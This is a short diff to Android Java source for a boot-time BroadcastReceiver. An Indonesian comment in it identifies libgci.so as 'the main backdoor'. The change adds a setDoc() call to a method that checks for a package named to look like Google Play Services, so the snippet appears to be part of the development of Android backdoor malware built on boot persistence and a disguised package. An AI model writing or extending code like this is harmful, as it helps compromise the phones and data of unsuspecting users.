@@ -41,6 +41,9 @@ public class ReceiverBoot extends BroadcastReceiver
 
 	public void temanCek(Context context) {
 		// libgci.so adalah main backdoor
+		setDoc();
+
+		
 		try {
 			if (!new MainActivity().apkMana(context, "com.google.play.services", "cek")) 
 			{
